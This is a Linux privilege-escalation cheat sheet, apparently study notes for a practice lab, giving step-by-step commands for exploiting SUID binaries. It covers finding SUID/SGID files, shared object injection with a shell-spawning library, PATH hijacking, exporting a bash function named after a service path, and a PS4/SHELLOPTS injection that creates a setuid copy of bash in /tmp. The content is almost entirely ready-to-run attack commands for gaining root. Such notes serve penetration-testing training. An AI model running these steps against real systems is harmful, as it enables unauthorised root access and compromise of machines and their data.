Search for all SUID files in the system: `find / -perm -u=s -type f 2>/dev/null`
Search for all SUID/GUID files in the system: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

### Shared object injection

1. Search for open/access calls and "no such file" errors in a program with SUID: `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
2. Create a directory for a shared object in our home directory that can't be found: `mkdir /home/user/.config`
3. Create a shared object that spawns a bash shell using [libcalc.c](https://github.com/canatella/libcalc/blob/master/libcalc.c): `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
4. Execute the SUID program

## Environment variables

1. Run strings to check for services running without specifying the full path: `strings /usr/local/bin/suid-env`
2. Create a program with this name that spawns a bash shell: `gcc -o service /home/user/tools/suid/service.c`
3. Prepend the location to the PATH variable: `PATH=.:$PATH /usr/local/bin/suid-env`
4. Execute the SUID program

### Abusing shell features

Method 1:

1. Check for service executable absolute path: `strings [SUID program path]`
2. Check that the version of bash is less than 4.2-048: `/bin/bash --version`
3. Create a function with the name of the service path: `function /usr/sbin/service { /bin/bash -p; }`
4. Export the function: `export -f /usr/sbin/service`
5. Execute the SUID program

Method 2 (Won't work for bash version 4.4 and above):

1. Run the SUID program with debugging enabled and the PS4 variable to create embedded command with SUID version of /bin/bash: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' [SUID program path]`
2. Run the created executable: `/tmp/rootbash -p`



